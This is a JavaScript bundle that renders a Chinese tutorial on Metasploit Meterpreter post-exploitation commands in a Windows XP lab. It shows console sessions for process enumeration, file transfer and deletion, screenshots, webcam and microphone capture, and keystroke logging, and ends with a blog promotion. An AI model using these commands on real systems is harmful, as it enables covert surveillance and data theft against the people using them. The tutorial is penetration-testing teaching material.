(window.webpackJsonp=window.webpackJsonp||[]).push([[251],{707:function(s,e,a){"use strict";a.r(e);var n=a(24),t=Object(n.a)({},(function(){var s=this,e=s.$createElement,a=s._self._c||e;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"metasploit基本后渗透命令"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#metasploit基本后渗透命令"}},[s._v("#")]),s._v(" Metasploit基本后渗透命令")]),s._v(" "),a("p",[s._v("核心Meterpreter命令指的是已经被Meterpreter攻击载荷成功渗透的计算机向我们提供的用于后渗透操作的基本功能。")]),s._v(" "),a("p",[a("strong",[s._v("注意：Metasploit的后渗透命令都是在拿到了目标主机的Meterpreter权限之后，在Meterpreter命令行下执行的各种命令操作。")])]),s._v(" "),a("h3",{attrs:{id:"帮助菜单"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#帮助菜单"}},[s._v("#")]),s._v(" 帮助菜单")]),s._v(" "),a("p",[s._v("输入help或者英文?就可以打开帮主菜单，如下所示：")]),s._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190127151346199.png",loading:"lazy"}})]),s._v(" "),a("p",[s._v("这里，输出的结果比较多，我只是截取了一部分信息。")]),s._v(" "),a("h3",{attrs:{id:"后渗透命令"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#后渗透命令"}},[s._v("#")]),s._v(" 后渗透命令")]),s._v(" "),a("p",[s._v("在进行渗透的时候，有时需要执行其他的任务。为了执行新的任务，需要将当前执行的Meterpreter会话切换到后台，这时就需要用到background命令。")]),s._v(" "),a("p",[s._v("如下：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("meterpreter > background\n[*] Backgrounding session 1...\nmsf5 exploit(windows/http/rejetto_hfs_exec) > \n\n此时，就需要将一个会话切换到前台的时候，就可以使用sessions命令加上该会话的标识符，命令格式为sessions -i\nmsf5 exploit(windows/http/rejetto_hfs_exec) > sessions\n\nActive sessions\n===============\n\n  Id  Name  Type                     Information                    Connection\n  --  ----  ----                     -----------                    ----------\n  1         meterpreter x86/windows  LIUYAZHUANG\\lyz @ LIUYAZHUANG  192.168.175.128:4444 -> 192.168.175.130:1043 (192.168.175.130)\n\nmsf5 exploit(windows/http/rejetto_hfs_exec) > sessions -i 1\n[*] Starting interaction with 1...\n\nmeterpreter > \n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br")])]),a("h3",{attrs:{id:"机器id和uuid命令"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#机器id和uuid命令"}},[s._v("#")]),s._v(" 机器ID和UUID命令")]),s._v(" "),a("p",[s._v("获取机器ID的命令：machine_id")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("meterpreter > machine_id\n[+] Machine ID: 172edb45d23942c9e4cbe768909b4f62\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("获取uuid的命令：uuid")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("meterpreter > uuid\n[+] UUID: 0535181070ecda36/x86=1/windows=1/2019-01-25T01:43:55Z\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("h3",{attrs:{id:"通信信道的操作"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#通信信道的操作"}},[s._v("#")]),s._v(" 通信信道的操作")]),s._v(" "),a("p",[s._v("这些操作可以通过channel实现")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("meterpreter > channel -l\n\n    Id  Class  Type\n    --  -----  ----\n    1   3      stdapi_process\n\nmeterpreter > \nmeterpreter > channel -r 1\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br")])]),a("p",[s._v("这里，我们使用channel -l 命令列出了所有可用的通信信道，然后使用channel -r [channel-id]命令选择了读取数据的通信信道。信道子系统允许通过所有的逻辑信道进行读取、列举、写入操作，这些逻辑信道都是Meterpreter命令行实现的通信子信道。")]),s._v(" "),a("h3",{attrs:{id:"获取用户名和进程信息"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#获取用户名和进程信息"}},[s._v("#")]),s._v(" 获取用户名和进程信息")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("meterpreter > machine_id \n[+] Machine ID: 172edb45d23942c9e4cbe768909b4f62\nmeterpreter > getuid\nServer username: LIUYAZHUANG\\lyz\nmeterpreter > getpid \nCurrent pid: 1680\nmeterpreter > ps\n\nProcess List\n============\n\n PID   PPID  Name               Arch  Session  User                 Path\n ---   ----  ----               ----  -------  ----                 ----\n 0     0     [System Process]                                       \n 4     0     System             x86   0                             \n 236   672   VGAuthService.exe  x86   0        NT AUTHORITY\\SYSTEM  C:\\Program Files\\VMware\\VMware Tools\\VMware VGAuth\\VGAuthService.exe\n 244   1040  wscntfy.exe        x86   0        LIUYAZHUANG\\lyz      C:\\WINDOWS\\system32\\wscntfy.exe\n 336   672   vmtoolsd.exe       x86   0        NT AUTHORITY\\SYSTEM  C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe\n 480   1680  hfs.exe            x86   0        LIUYAZHUANG\\lyz      E:\\©������\\HFS\\hfs.exe\n 540   4     smss.exe           x86   0        NT AUTHORITY\\SYSTEM  \\SystemRoot\\System32\\smss.exe\n 604   540   csrss.exe          x86   0        NT AUTHORITY\\SYSTEM  \\??\\C:\\WINDOWS\\system32\\csrss.exe\n 608   1220  cmd.exe            x86   0        LIUYAZHUANG\\lyz      C:\\WINDOWS\\system32\\cmd.exe\n 628   540   winlogon.exe       x86   0        NT AUTHORITY\\SYSTEM  \\??\\C:\\WINDOWS\\system32\\winlogon.exe\n 672   628   services.exe       x86   0        NT AUTHORITY\\SYSTEM  C:\\WINDOWS\\system32\\services.exe\n 684   628   lsass.exe          x86   0        NT AUTHORITY\\SYSTEM  C:\\WINDOWS\\system32\\lsass.exe\n 860   672   vmacthlp.exe       x86   0        NT AUTHORITY\\SYSTEM  C:\\Program Files\\VMware\\VMware Tools\\vmacthlp.exe\n 876   672   svchost.exe        x86   0        NT AUTHORITY\\SYSTEM  C:\\WINDOWS\\system32\\svchost.exe\n 944   672   svchost.exe        x86   0                             C:\\WINDOWS\\system32\\svchost.exe\n 1040  672   svchost.exe        x86   0        NT AUTHORITY\\SYSTEM  C:\\WINDOWS\\System32\\svchost.exe\n 1132  672   svchost.exe        x86   0                             C:\\WINDOWS\\system32\\svchost.exe\n 1196  672   alg.exe            x86   0                             C:\\WINDOWS\\System32\\alg.exe\n 1224  876   wmiprvse.exe       x86   0                             C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe\n 1236  672   svchost.exe        x86   0                             C:\\WINDOWS\\system32\\svchost.exe\n 1416  672   spoolsv.exe        x86   0        NT AUTHORITY\\SYSTEM  C:\\WINDOWS\\system32\\spoolsv.exe\n 1428  608   conime.exe         x86   0        LIUYAZHUANG\\lyz      C:\\WINDOWS\\system32\\conime.exe\n 1504  628   logon.scr          x86   0        LIUYAZHUANG\\lyz      C:\\WINDOWS\\System32\\logon.scr\n 1680  1648  explorer.exe       x86   0        LIUYAZHUANG\\lyz      C:\\WINDOWS\\Explorer.EXE\n 1808  1680  vmtoolsd.exe       x86   0        LIUYAZHUANG\\lyz      C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe\n 1832  1680  ctfmon.exe         x86   0        LIUYAZHUANG\\lyz      C:\\WINDOWS\\system32\\ctfmon.exe\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br"),a("span",{staticClass:"line-number"},[s._v("29")]),a("br"),a("span",{staticClass:"line-number"},[s._v("30")]),a("br"),a("span",{staticClass:"line-number"},[s._v("31")]),a("br"),a("span",{staticClass:"line-number"},[s._v("32")]),a("br"),a("span",{staticClass:"line-number"},[s._v("33")]),a("br"),a("span",{staticClass:"line-number"},[s._v("34")]),a("br"),a("span",{staticClass:"line-number"},[s._v("35")]),a("br"),a("span",{staticClass:"line-number"},[s._v("36")]),a("br"),a("span",{staticClass:"line-number"},[s._v("37")]),a("br"),a("span",{staticClass:"line-number"},[s._v("38")]),a("br"),a("span",{staticClass:"line-number"},[s._v("39")]),a("br")])]),a("h3",{attrs:{id:"获取系统信息"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#获取系统信息"}},[s._v("#")]),s._v(" 获取系统信息")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("meterpreter > sysinfo\nComputer        : LIUYAZHUANG\nOS              : Windows XP (Build 2600, Service Pack 3).\nArchitecture    : x86\nSystem Language : zh_CN\nDomain          : WORKGROUP\nLogged On Users : 2\nMeterpreter     : x86/windows\nmeterpreter > \n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br")])]),a("h3",{attrs:{id:"网络命令"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#网络命令"}},[s._v("#")]),s._v(" 网络命令")]),s._v(" "),a("ul",[a("li",[s._v("ipconfig/ifconfig：显示被渗透主机所连接的所有内部网络")]),s._v(" "),a("li",[s._v("arp：显示所有和被渗透主机建立过连接的IP地址，这样可以获得更过关于目标邻近系统的信息")]),s._v(" "),a("li",[s._v("netstat：显示当前所有正在使用端口以及运行在这些端口上的进程信息。")])]),s._v(" "),a("h3",{attrs:{id:"文件操作命令"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#文件操作命令"}},[s._v("#")]),s._v(" 文件操作命令")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("pwd：查看当前的工作目录\ncd：切换到目标文件夹\ncd [目标文件夹]\nmkdir：创建文件夹\nmkdir [文件夹]\nupload:将文件上传到目标系统\nupload [本地文件] [目标系统路径]\nedit:修改文件\nedit [目标文件]\nls：列出目标主机指定目录中的文件\nls [目标文件夹]\nrmr:删除目标系统上指定的文件夹\nrmr [目标文件夹]\nrm：删除目标系统上指定的文件\nrm [目标文件]\ndownload：从目标下载文件\ndownload [目标文件] [本地路径]\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br")])]),a("h3",{attrs:{id:"桌面命令"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#桌面命令"}},[s._v("#")]),s._v(" 桌面命令")]),s._v(" "),a("p",[s._v("使用enumdesktops和getdesktop可以查看被渗透主机的桌面信息，enumdesktops列出了所有可以访问的桌面，而getdesktop列出了当前桌面的相关信息，如下：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("meterpreter > enumdesktops \nEnumerating all accessible desktops\n\nDesktops\n========\n\n    Session  Station   Name\n    -------  -------   ----\n    0        WinSta0   Default\n    0        WinSta0   Disconnect\n    0        WinSta0   Winlogon\n    0        SAWinSta  SADesktop\n\nmeterpreter > getdesktop \nSession 0\\W\\D\nmeterpreter > \n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br")])]),a("h3",{attrs:{id:"截图和摄像头列举"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#截图和摄像头列举"}},[s._v("#")]),s._v(" 截图和摄像头列举")]),s._v(" "),a("h4",{attrs:{id:"获取当前桌面的快照"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#获取当前桌面的快照"}},[s._v("#")]),s._v(" 获取当前桌面的快照")]),s._v(" "),a("p",[s._v("使用screenshot命令")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("meterpreter > screenshot \nScreenshot saved to: /root/iOOsMPCB.jpeg\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("截图的结果：")]),s._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190127151940461.png",loading:"lazy"}})]),s._v(" "),a("h4",{attrs:{id:"列举摄像头"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#列举摄像头"}},[s._v("#")]),s._v(" 列举摄像头")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("webcam_list \n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h4",{attrs:{id:"录制实时视频"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#录制实时视频"}},[s._v("#")]),s._v(" 录制实时视频")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("webcam_stream \n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h4",{attrs:{id:"拍照"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#拍照"}},[s._v("#")]),s._v(" 拍照")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("webcam_snap \n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h4",{attrs:{id:"进行环境监听"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#进行环境监听"}},[s._v("#")]),s._v(" 进行环境监听")]),s._v(" "),a("p",[s._v("某些时候我们可能处于监视目的需要进行环境监听，就可以使用record_mic命令。")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("meterpreter > record_mic \n[*] Starting...\n[*] Stopped\nAudio saved to: /root/hStZovMr.wav\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[s._v("也可以使用record_mic命令加上-d参数制定录音的长度，这个参数单位是秒。")]),s._v(" "),a("h4",{attrs:{id:"计算目标系统闲置时间"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#计算目标系统闲置时间"}},[s._v("#")]),s._v(" 计算目标系统闲置时间")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("idletime\nmeterpreter > idletime\nUser has been idle for: 21 mins 19 secs\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("h4",{attrs:{id:"监控键盘"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#监控键盘"}},[s._v("#")]),s._v(" 监控键盘")]),s._v(" "),a("ul",[a("li",[s._v("启动监听：keyscan_start")]),s._v(" "),a("li",[s._v("导出记录：keyscan_dump")]),s._v(" "),a("li",[s._v("停止监听：keyscan_stop")])]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("meterpreter > keyscan_start\nStarting the keystroke sniffer ...\nmeterpreter > keyscan_dump \nDumping captured keystrokes...\n\n\nmeterpreter > keyscan_stop\nStopping the keystroke sniffer...\nmeterpreter > \n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br")])]),a("h2",{attrs:{id:"写在最后"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[s._v("#")]),s._v(" 写在最后")]),s._v(" "),a("blockquote",[a("p",[s._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),a("strong",[s._v("冰河技术")]),s._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),a("strong",[s._v("冰河技术")]),s._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),a("strong",[s._v("冰河技术")]),s._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),a("strong",[s._v("冰河技术")]),s._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),s._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);e.default=t.exports}}]);